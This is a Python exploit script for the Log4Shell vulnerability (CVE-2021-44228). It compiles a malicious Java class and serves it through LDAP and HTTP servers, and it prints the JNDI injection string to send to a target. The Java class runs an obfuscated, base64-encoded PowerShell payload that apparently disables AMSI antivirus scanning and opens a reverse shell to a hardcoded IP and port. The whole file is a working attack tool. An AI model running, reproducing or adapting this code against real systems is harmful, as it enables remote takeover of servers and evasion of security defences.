#!/usr/bin/env python3

import argparse
from colorama import Fore, init
import subprocess
import threading
from pathlib import Path
import os
from http.server import HTTPServer, SimpleHTTPRequestHandler

CUR_FOLDER = Path(__file__).parent.resolve()


def generate_payload(userip: str, lport: int) -> None:
    program = """
public class Exploit {

    static {
        
        try {
            java.lang.Runtime.getRuntime().exec("powershell.exe -exec bypass -enc IwBSAGEAcwB0AGEALQBtAG8AdQBzAGUAcwAgAEEAbQBzAGkALQBTAGMAYQBuAC0AQgB1AGYAZgBlAHIAIABwAGEAdABjAGgAIABcAG4ACgAkAGkAZABzAG0AcQAgAD0AIABAACIACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7AAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwAKAHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAAaQBkAHMAbQBxACAAewAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsACAAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4AYQBtAGUAKQA7AAoAIAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIAIgApAF0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAATABvAGEAZABMAGkAYgByAGEAcgB5ACgAcwB0AHIAaQBuAGcAIABuAGEAbQBlACkAOwAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgASQBuAHQAUAB0AHIAIABsAHAAQQBkAGQAcgBlAHMAcwAsACAAVQBJAG4AdABQAHQAcgAgAG4AYwBnAG4AcwB0ACwAIAB1AGkAbgB0ACAAZgBsAE4AZQB3AFAAcgBvAHQAZQBjAHQALAAgAG8AdQB0ACAAdQBpAG4AdAAgAGwAcABmAGwATwBsAGQAUAByAG8AdABlAGMAdAApADsACgB9AAoAIgBAAAoACgBBAGQAZAAtAFQAeQBwAGUAIAAkAGkAZABzAG0AcQAKAAoAJAB6AHMAZAB5AHgAbABkACAAPQAgAFsAaQBkAHMAbQBxAF0AOgA6AEwAbwBhAGQATABpAGIAcgBhAHIAeQAoACIAJAAoACgAJwDgAG0AcwDsACcAKwAnAC4AZABsAGwAJwApAC4ATgBPAFIATQBhAEwAaQBaAEUAKABbAGMASABhAHIAXQAoADMAMQArADMAOQApACsAWwBjAEgAYQBSAF0AKAA5ADEAKwAyADAAKQArAFsAYwBIAGEAUgBdACgAMQAxADQAKwAxADQALQAxADQAKQArAFsAYwBIAGEAUgBdACgAMQAwADkAKQArAFsAYwBIAGEAUgBdACgANgAzACsANQApACkAIAAtAHIAZQBwAGwAYQBjAGUAIABbAGMAaABhAHIAXQAoADkAMgArADUAMAAtADUAMAApACsAWwBDAGgAYQBSAF0AKAAxADEAMgApACsAWwBjAEgAQQBSAF0AKAAxADIAMwApACsAWwBDAEgAQQBSAF0AKABbAGIAWQBUAEUAXQAwAHgANABkACkAKwBbAEMAaABhAHIAXQAoADEAMQAwACsAMgAzAC0AMgAzACkAKwBbAGMAaABhAFIAXQAoADEAMgA1ACkAKQAiACkACgAkAHEAcQBnAG8AbQBzACAAPQAgAFsAaQBkAHMAbQBxAF0AOgA6AEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoACQAegBzAGQAeQB4AGwAZAAsACAAIgAkACgAKAAnAMQAbQBzAO0AUwBjACcAKwAnAOEAbgBCAHUAZgBmACcAKwAnAGUAcgAnACkALgBuAG8AcgBtAEEAbABJAHoAZQAoAFsAQwBoAGEAcgBdACgAWwBCAHkAdABlAF0AMAB4ADQANgApACsAWwBDAEgAQQBSAF0AKAAxADEAMQArADIALQAyACkAKwBbAGMAaABhAHIAXQAoADEAMQA0ACoANgAzAC8ANgAzACkAKwBbAEMASABhAHIAXQAoAFsAQgBZAHQARQBdADAAeAA2AGQAKQArAFsAQwBIAEEAUgBdACgANgA4ACkAKQAgAC0AcgBlAHAAbABhAGMAZQAgAFsAQwBIAGEAcgBdACgAWwBiAFkAVABlAF0AMAB4ADUAYwApACsAWwBjAGgAYQBSAF0AKABbAEIAeQB0AEUAXQAwAHgANwAwACkAKwBbAGMASABBAHIAXQAoAFsAYgBZAHQAZQBdADAAeAA3AGIAKQArAFsAQwBoAGEAUgBdACgAWwBiAFkAdABFAF0AMAB4ADQAZAApACsAWwBDAGgAQQByAF0AKAAxADEAMAArADgAMQAtADgAMQApACsAWwBDAEgAYQBSAF0AKABbAEIAWQBUAEUAXQAwAHgANwBkACkAKQAiACkACgAkAHAAIAA9ACAAMAAKAFsAaQBkAHMAbQBxAF0AOgA6AFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAoACQAcQBxAGcAbwBtAHMALAAgAFsAdQBpAG4AdAAzADIAXQA1ACwAIAAwAHgANAAwACwAIABbAHIAZQBmAF0AJABwACkACgAkAHUAeABuAHoAIAA9ACAAIgAwAHgAQgA4ACIACgAkAHYAZgBzAGQAIAA9ACAAIgAwAHgANQA3ACIACgAkAGsAaABqAGQAIAA9ACAAIgAwAHgAMAAwACIACgAkAGcAcAB0AHkAIAA9ACAAIgAwAHgAMAA3ACIACgAkAGsAYgBmAGoAIAA9ACAAIgAwAHgAOAAwACIACgAkAHcAYgBpAHYAIAA9ACAAIgAwAHgAQwAzACIACgAkAHIAcwB6AGsAawAgAD0AIABbAEIAeQB0AGUAWwBdAF0AIAAoACQAdQB4AG4AegAsACQAdgBmAHMAZAAsACQAawBoAGoAZAAsACQAZwBwAHQAeQAsACsAJABrAGIAZgBqACwAKwAkAHcAYgBpAHYAKQAKAFsAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAF0AOgA6AEMAbwBwAHkAKAAkAHIAcwB6AGsAawAsACAAMAAsACAAJABxAHEAZwBvAG0AcwAsACAANgApAAoACgAkAGMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAxADAALgAxADQALgA5ADAAJwAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACIALgAgAHsAIAAkAGQAYQB0AGEAIAB9ACAAMgA+ACYAMQAiACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAIAAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA").waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Exploit(){
        System.out.println("I am Log4jRCE from remote222!!!");
    }
}"""

    # writing the exploit to Exploit.java file

    p = Path("Exploit.java")

    try:
        p.write_text(program)
        subprocess.run([os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/javac"), str(p)])
    except OSError as e:
        print(Fore.RED + f'[-] Something went wrong {e}')
        raise e
    else:
        print(Fore.GREEN + '[+] Exploit java class created success')


def payload(userip: str, webport: int, lport: int) -> None:
    generate_payload(userip, lport)

    print(Fore.GREEN + '[+] Setting up LDAP server\n')

    # create the LDAP server on new thread
    t1 = threading.Thread(target=ldap_server, args=(userip, webport))
    t1.start()

    # start the web server
    print(f"[+] Starting Webserver on port {webport} http://0.0.0.0:{webport}")
    httpd = HTTPServer(('0.0.0.0', webport), SimpleHTTPRequestHandler)
    httpd.serve_forever()


def check_java() -> bool:
    exit_code = subprocess.call([
        os.path.join(CUR_FOLDER, 'jdk1.8.0_20/bin/java'),
        '-version',
    ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    return exit_code == 0


def ldap_server(userip: str, lport: int) -> None:
    sendme = "${jndi:ldap://%s:1389/a}" % (userip)
    print(Fore.GREEN + f"[+] Send me: {sendme}\n")

    url = "http://{}:{}/#Exploit".format(userip, lport)
    subprocess.run([
        os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/java"),
        "-cp",
        os.path.join(CUR_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
        "marshalsec.jndi.LDAPRefServer",
        url,
    ])


def main() -> None:
    init(autoreset=True)
    print(Fore.BLUE + """
[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc
""")

    parser = argparse.ArgumentParser(description='log4shell PoC')
    parser.add_argument('--userip',
                        metavar='userip',
                        type=str,
                        default='localhost',
                        help='Enter IP for LDAPRefServer & Shell')
    parser.add_argument('--webport',
                        metavar='webport',
                        type=int,
                        default='8000',
                        help='listener port for HTTP port')
    parser.add_argument('--lport',
                        metavar='lport',
                        type=int,
                        default='9001',
                        help='Netcat Port')

    args = parser.parse_args()

    try:
        if not check_java():
            print(Fore.RED + '[-] Java is not installed inside the repository')
            raise SystemExit(1)
        payload(args.userip, args.webport, args.lport)
    except KeyboardInterrupt:
        print(Fore.RED + "user interrupted the program.")
        raise SystemExit(0)


if __name__ == "__main__":
    main()
